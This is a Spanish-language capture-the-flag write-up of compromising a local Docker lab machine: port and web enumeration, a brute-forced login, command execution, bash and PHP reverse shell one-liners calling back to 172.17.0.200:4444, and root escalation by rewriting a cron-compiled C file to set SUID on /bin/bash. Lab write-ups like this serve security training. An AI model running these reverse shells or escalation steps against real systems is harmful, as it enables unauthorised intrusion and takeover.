# Enumeracion de Puertos, Servicios y Versiones

```ruby
 nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 23:08 -03
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 cc:70:cb:29:31:d9:48:f7:e2:2f:ec:b2:65:8c:ee:8e (ED25519)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x91\x8B Mario \xC3\x81lvarez Fer\xC5\x84andez
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
```

comienzo chequeando el servicio web y me consigo con la web personal del 🐧 de Mario 


![Screenshot From 2024-11-11 23-13-01](https://github.com/user-attachments/assets/20045d1b-0ef3-404c-85da-1fa84977699a)

# Fuzzing web

```ruby
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      309c http://172.17.0.2/images => http://172.17.0.2/images/
200      GET       35l      137w     1309c http://172.17.0.2/scripts/ver-mas.js
200      GET       32l      179w    11889c http://172.17.0.2/images/tux.webp
200      GET      447l     1365w    22274c http://172.17.0.2/index.php
200      GET       18l       78w     4828c http://172.17.0.2/images/docker.webp
200      GET      142l      909w    62761c http://172.17.0.2/images/secure.png
200      GET      159l     1002w    76274c http://172.17.0.2/images/redes.png
200      GET      795l     3799w   328467c http://172.17.0.2/images/academia.png
200      GET       32l      113w    10640c http://172.17.0.2/images/python.webp
200      GET       35l      167w     1669c http://172.17.0.2/scripts/popup.js
200      GET       38l      169w    12216c http://172.17.0.2/images/ren.jpg
200      GET       11l       47w     4357c http://172.17.0.2/images/js.png
200      GET       77l      550w    56414c http://172.17.0.2/images/ballena.jpg
200      GET       32l      196w    16760c http://172.17.0.2/images/pylon.webp
200      GET       39l      292w    21234c http://172.17.0.2/images/html.png
200      GET     1512l     8154w   623812c http://172.17.0.2/images/pinguino.png
200      GET       24l      179w    11724c http://172.17.0.2/images/docker.png
200      GET        1l        5w       23c http://172.17.0.2/images/token
200      GET      206l     1767w   205268c http://172.17.0.2/images/discord.png
200      GET       78l      382w    27216c http://172.17.0.2/images/jordi.jpeg
200      GET       43l      303w    21894c http://172.17.0.2/images/css.png
200      GET      387l     2175w   190027c http://172.17.0.2/images/kali.png
200      GET      186l     1034w    74323c http://172.17.0.2/images/telegram.webp
200      GET       88l      632w    54943c http://172.17.0.2/images/bash.png
200      GET      355l     1906w   141871c http://172.17.0.2/images/sql.png
200      GET      940l     5788w   444603c http://172.17.0.2/images/4k4m1m3.png
200      GET      447l     1365w    22274c http://172.17.0.2/
200      GET       84l      326w     3141c http://172.17.0.2/scripts/script.js
301      GET        9l       28w      310c http://172.17.0.2/scripts => http://172.17.0.2/scripts/
200      GET      451l     1810w    12484c http://172.17.0.2/sobre-mi/styles.css
200      GET       57l      120w     1682c http://172.17.0.2/sobre-mi/sms.php
200      GET     1512l     8154w   623812c http://172.17.0.2/sobre-mi/pinguino.png
200      GET      140l      530w     6706c http://172.17.0.2/sobre-mi/
302      GET        0l        0w        0c http://172.17.0.2/sobre-mi/login.php => sms.php
[####################] - 63s  4568630/4568630 0s      found:34      errors:413646 
[####################] - 63s  2283919/2283919 36501/s http://172.17.0.2/ 
[####################] - 0s   2283919/2283919 13125971/s http://172.17.0.2/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 62s  2283919/2283919 36712/s http://172.17.0.2/sobre-mi/ 
[####################] - 0s   2283919/2283919 23305296/s http://172.17.0.2/scripts/ => Directory listing (add --scan-dir-listings to scan)     
```
revisando no veo algo de interes en el reporte asi que despues de navegar un poco por la web me consigo con un panel de login cuando intento ir al `Perfil de LinkedIn`
del 🐧

![Screenshot From 2024-11-11 23-19-41](https://github.com/user-attachments/assets/fb270ba8-42b8-4547-b204-5c4e303ec10f)


![Screenshot From 2024-11-11 23-19-59](https://github.com/user-attachments/assets/d94f75b5-07f7-4eac-928b-bc0446d7a648)

reviso codigo fuente no obtengo nada asi que aplico un ataque de fuerza bruta 💪

# Ataque de Fuerza Bruta 💪 login

aqui intente un rato con varios usuarios hasta que logre dar con credenciales


![Screenshot From 2024-11-11 23-25-33](https://github.com/user-attachments/assets/f28615a1-af9c-4bec-9b1a-6a98ab91bd9a)


tras iniciar sesion me consigo con credenciales por ssh y un mensajes:


![Screenshot From 2024-11-11 23-27-36](https://github.com/user-attachments/assets/838d944a-884e-4249-8e3e-c91870169bb1)


asi que intento acceder via ssh


![Screenshot From 2024-11-11 23-28-54](https://github.com/user-attachments/assets/54841d08-ae3d-4c39-ae30-d548e727d7a2)


pero al parecer el rechazo de conexion tiene que ver con el mensaje de que ` el sistema a sido configurado para restringir un rango de ip por seguridad`
asi que por ahora probare si `confidencial.php` llega ser vulnerable a un `LFI` o `RFI` 

![Screenshot From 2024-11-11 23-37-03](https://github.com/user-attachments/assets/0f51965f-ee57-4366-b349-f12e7eb26a24)


pero continuo observando lo mismo que venia viendo desde antes, que de pronto se paraba la herramienta y no completaba el escaneo, antes no sabia el motivo 
pero despues de observar el mensaje de la restriccion me queda claro que estoy en un rango de ip que el servidor esta bloqueando, por lo que ire alternando 
y testeando si continuo manteniendo el mismo resultado

![Screenshot From 2024-11-11 23-48-14](https://github.com/user-attachments/assets/5148d85a-d61b-4dc9-9659-b6982b7151b9)

cambiando de `ip` logre llegar al segmento de red que no esta restringido


![Screenshot From 2024-11-11 23-50-17](https://github.com/user-attachments/assets/10defb51-7e0c-4f7b-ac07-99dbdb952f4d)


aqui obtuve un resultado que pinta bien, pero recuerdo que tenia tambien credenciales via `ssh` asi que ahora vuelvo intentar el accedo por esa via

![Screenshot From 2024-11-11 23-54-23](https://github.com/user-attachments/assets/f139e9c0-5cf5-4cc5-82c3-fbaebf5e21bc)

esta vez si pude acceder via `ssh` pero resulta ser que el user `darks` se encuentra dentro de una `-rbash` por lo que seguire con el parametro `cmd` que
consegui anteriormente


![Screenshot From 2024-11-11 23-55-58](https://github.com/user-attachments/assets/c8757e66-13a4-459b-b211-fa0b43652290)


por lo visto, tengo `ejecucion remota de comandos` asi que me coloco en escucha por netcat y me envio una revershell


![Screenshot From 2024-11-12 00-00-06](https://github.com/user-attachments/assets/9befb350-bcfc-49f1-b3f4-ad51d4083853)


![Screenshot From 2024-11-12 00-00-38](https://github.com/user-attachments/assets/1d1497f1-d29c-4017-be65-49f886d1eb20)

envio la tipica revershell `/bin/bash -i >& /dev/tcp/172.17.0.200/4444 0>&1` url-encodeada y al poco rato me saca del sistema, asi que enviare una `revershell PHP`


![Screenshot From 2024-11-12 00-03-14](https://github.com/user-attachments/assets/00d06848-a8cd-464e-bcbe-0f537e279689)

ahora si se mantiene la conexion; revershell enviada = `php -r '$sock=fsockopen("172.17.0.200",4444);exec("/bin/bash <&3 >&3 2>&3");'` url-encodeada

# Escalada de privilegios

### www-data

tratamiento de la terminal

```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```
existen 2 usuarios en el sistema; `darks` & `cristal` pero `dark` tiene una `-rbash` asi que no nos sive de mucho buscar llegar a el, buscando en el sistema
no consegui nada de ningun usuario que me permitiera la escalada, pero si consegui un ejecutable propiedad de `www-data`

![Screenshot From 2024-11-12 00-16-20](https://github.com/user-attachments/assets/807bfd63-0f03-43fc-9840-d35137d7b27d)

ejecuto el binario pero no pasa nada aparentemente, asi que levanto un server con python y descargo el binario en mi maquina para analizarlo


![image](https://github.com/user-attachments/assets/58a03d2b-6425-4593-8dcd-05751db17bf5)


ya por aqui puedo ver cositas, una direccion `ip= 172.17.0.188` un mensaje de error `Error al enviar datos` asi que parece que el binario envia informacion a la
ip `172.17.0.188` y por otro lado me parece que tiene una cadena codificada en `base64` o `base32`, pero despues de intentar decodificar, resulta ser ilegible, asi
que me quedo con la `ip` y el mensaje de error para ejecutar el binario y analizar la red


![image](https://github.com/user-attachments/assets/988fd292-4699-45a8-96b6-40fe417c1861)


por lo que observo, al ejecutar el binario y chequear el trafico de red se puede ver como se realiza una solicitud `arp` preguntando por la ip `172.17.0.188`
esto con el fin de poder comunicarse con ella a nivel del enlace de datos, asi que cambiare mi ip por la ip `172.17.0.188`


```ruby
ip addres del 172.17.0.200/16 dev docker0 
```
```ruby
ip addres add 172.17.0.188/16 dev docker0
```
despues de cambiar de `ip` e intentar ejecutar el binario y observar el trafico, por alguna razon no puedo ver nada, como si no existiera trafico de red y la conexion
con el server se cayo, asi que vuelvo a conectarme al server y esta vez desde el mismo server ejecuto el binario y desde mi maquina (ya teniendo la ip `172.17.0.188`)
observo el trafico de la red con `tcpdump`


![image](https://github.com/user-attachments/assets/6b193667-528f-4b24-a1c5-4539b6c77319)


ahora si puedo ver el trafico de red pero con mas informacion, tipo de conexion `UDP` puerto `7777`

![Screenshot From 2024-11-12 11-42-42](https://github.com/user-attachments/assets/6c07f3ab-c745-4a16-a93f-2791d2c8ec10)



recibo la cadena:

```bash
MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====
```
ahora intento decodificarla, ya que parece ser base64 o base32 y quizas hasta las 2 podrian ser

![image](https://github.com/user-attachments/assets/13db51c6-9c9c-40d0-8a78-5ddc9be91b4f)


bueno, parece que no soy el primero 🥇 en llegar a vulnerar el servidor, e incluso han dejado las credenciales de `cristal` 

### Cristal

![image](https://github.com/user-attachments/assets/d0c62a34-f726-4b73-abd4-15871e51725d)

systm.sh
```bash
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done

```
este script en bash lo que hace es compilar un programa en c y ejecutar el binario dentro de un bucle while cada 15 segundos, aqui se puede ver un error de programacion... 
sigo chequeando

systm.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <time.h>

void log_system_info(const char *filename) {
    FILE *log_file = fopen(filename, "a");
    if (log_file == NULL) {
        perror("Error al abrir el archivo de log");
        exit(EXIT_FAILURE);
    }

    // Información del sistema
    struct utsname sys_info;
    if (uname(&sys_info) < 0) {
        perror("Error al obtener información del sistema");
        exit(EXIT_FAILURE);
    }

    // Tiempo de inicio del sistema
    struct timespec uptime;
    if (clock_gettime(CLOCK_BOOTTIME, &uptime) < 0) {
        perror("Error al obtener el tiempo de inicio del sistema");
        exit(EXIT_FAILURE);
    }
    time_t boot_time = time(NULL) - uptime.tv_sec;

    // Escribir la información en el archivo de log
    fprintf(log_file, "-----------------------------\n");
    fprintf(log_file, "Fecha y Hora: %s", ctime(&boot_time));
    fprintf(log_file, "Nombre del Sistema: %s\n", sys_info.sysname);
    fprintf(log_file, "Nombre del Host: %s\n", sys_info.nodename);
    fprintf(log_file, "Versión del Sistema: %s\n", sys_info.release);
    fprintf(log_file, "Versión del Kernel: %s\n", sys_info.version);
    fprintf(log_file, "Arquitectura de Hardware: %s\n", sys_info.machine);
    fprintf(log_file, "-----------------------------\n");

    fclose(log_file);
}

int main() {
    const char *log_filename = "/tmp/registros.log";

    log_system_info(log_filename);

    return 0;
}
```
este resulta ser el programa que se ejecuta dentro del script en bash, programa el cual podemos modificar, ya que el grupo `editor` tiene permisos de escritura
y el user `cristal` pertenece a dicho grupo

![image](https://github.com/user-attachments/assets/ff547e45-7f80-4b2f-baee-816a149125c9)

asi que lo que hare sera reescribir completamente el codigo para que le asigne el bit SUID al binario /bin/bash. El codigo que usare para tal fin es el siguiente:

systm.c
```
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *command = "chmod u+s /bin/bash";

    // Ejecutar el comando usando system()
    (void)system(command); // Ignorar el resultado

    return 0;
}
```
guardo los cambios y espero unos segundos mientra el script `systm.sh` vuelve a compilar y ejecutar el binario

![image](https://github.com/user-attachments/assets/1234103e-7024-433a-9990-4ce20f389970)

ya asignado el BIT SUID solo queda pasar a `root`

![image](https://github.com/user-attachments/assets/55698055-5086-4d90-b265-cc274246b62d)

modifico el archivo `/etc/passwd`

![image](https://github.com/user-attachments/assets/6461d666-fecc-4d10-b56e-fe334fc34041)

vuelvo al user `cristal` y escalo completamente a root

![image](https://github.com/user-attachments/assets/647c2c9e-c997-4c9a-9a6f-2bf5bd2d0b34)

### root
